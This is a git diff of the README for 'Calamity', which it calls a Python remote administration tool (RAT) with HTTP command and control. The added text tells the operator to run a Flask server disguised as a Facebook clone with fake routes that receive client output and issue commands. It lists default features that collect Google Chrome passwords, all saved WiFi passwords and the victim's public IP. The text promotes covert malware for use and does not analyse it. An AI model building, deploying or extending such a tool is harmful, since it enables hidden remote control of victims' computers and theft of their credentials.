@@ -2,7 +2,7 @@
 
 <p align="center">
 <a href="#"><img src="https://img.shields.io/badge/Python-blue?label=Made%20With&style=flat-square%22%20alt=%22C#%20Language"></a> ||
-<a href="https://github.com/XIT07/Config-openbullet/blob/master/LICENSE"><img src="https://img.shields.io/badge/License-MIT-brightgreen?&style=flat-square" alt="License"></a>
+<a href="#"><img src="https://img.shields.io/badge/License-MIT-brightgreen?&style=flat-square" alt="License"></a>
 </p>
 <br>
 
@@ -23,6 +23,28 @@
 
 # About Calamity
 Calamity is a Remote Administration Tool (RAT) written in Python using HTTP as a C&amp;C
+
+# Instructions
+Run the flask server on your server.
+Calamity is a facebook clone, working with some fake approutes.
+ - <img src="https://img.shields.io/badge/POST-/facebook-lightblue?&style=flat-square" alt="Method Post"> Saves all output from the client to a file on your server
+ - <img src="https://img.shields.io/badge/GET-/facebookfriends-red?&style=flat-square" alt="Method Get"> Displays the current statuscode/command variable
+ - <img src="https://img.shields.io/badge/GET-/changeFacebookFriends-red?&style=flat-square" alt="Method Get"> Renders form to change statuscode/command variable
+ - <img src="https://img.shields.io/badge/POST-/FacebookAddStatusFriend-lightblue?&style=flat-square" alt="Method Post"> Post to change to statuscode/command variable
+ - <img src="https://img.shields.io/badge/POST-/FacebookAddStatus-lightblue?&style=flat-square" alt="Method Post"> Post to change to statuscode/command variable
+
+Instructions to run on the client should be placed in update.py at the bottom:
+ - Some basic instructions were added as a default e.g: dir, whoami, ipconfig, ...
+ - Statuscode 98 means 'Do Nothing & Wait for a change'
+ - Statuscode 99 means 'Post Data to server'
+ - !!! Do not change these 2 statuscodes unless you know what you are doing !!!
+
+# Features
+You are free to add any feature you want to this remote administration tool.
+I have added 3 default ones:
+ - Collect Google Chrome Passwords
+ - Collect all WiFi Passwords
+ - Collect public IP
 
 ## License
 
